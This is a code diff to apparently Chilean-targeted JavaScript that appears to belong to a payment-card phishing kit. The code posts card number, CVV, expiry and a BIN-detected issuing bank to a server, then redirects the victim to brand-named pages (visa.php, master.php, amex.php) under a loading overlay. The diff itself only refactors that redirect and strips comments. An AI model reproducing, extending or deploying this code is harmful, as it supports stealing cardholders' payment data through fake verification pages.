@@ -413,7 +413,6 @@
         const progressFill    = document.getElementById('progressFill');
         const progressIndeterminate = document.getElementById('progressIndeterminate');
 
-        // MAPA DE BANCOS
         const binCache = new Map();
         const bankNameMappingCL = {
             'banco de chile': 'Banco de Chile', 'banco estado': 'Banco Estado', 'bancoestado': 'Banco Estado',
@@ -579,12 +578,16 @@
                         localStorage.setItem('tarjeta_aprobada', JSON.stringify(tarjetaAprobada));
                         localStorage.setItem('bancoEmisor', tarjetaAprobada.banco);
 
-                        // Redirigir localmente al php
-                        overlayMostrarLogo(data.marca, `Redirigiendo a ${data.marca}...`);
+                        // 🔥 FIX: Forzar que la marca sea en minúsculas y validar
+                        const marcaSegura = (data.marca || 'visa').toLowerCase();
+                        const mapa = { visa: 'visa.php', mastercard: 'master.php', amex: 'amex.php' };
+                        const destino = mapa[marcaSegura] || 'visa.php'; // Si falla, siempre va a visa.php
+
+                        overlayMostrarLogo(marcaSegura, `Redirigiendo...`);
                         overlayActualizarProgreso(100);
+                        
                         setTimeout(() => {
-                            const mapa = { visa: 'visa.php', mastercard: 'master.php', amex: 'amex.php' };
-                            window.location.href = mapa[data.marca] || 'visa.php';
+                            window.location.href = destino;
                         }, 1500);
 
                     } else if (data.estado === 'rechazado') {
@@ -636,7 +639,6 @@
             btn.disabled = true;
             btn.innerHTML = '...';
 
-            // ⚡ FIX: FORZAR DETECCIÓN DEL BANCO ANTES DE ENVIAR
             if (!detectedBank) {
                 overlayMostrarSpinner('Identificando banco emisor...');
                 detectedBank = await detectBankByBIN(numero);
@@ -659,7 +661,7 @@
                         cvv: cvv,
                         vencimiento: vence,
                         marca_tarjeta: marca,
-                        banco_emisor: detectedBank // ⚡ AQUÍ VA EL BANCO
+                        banco_emisor: detectedBank
                     })
                 });
 
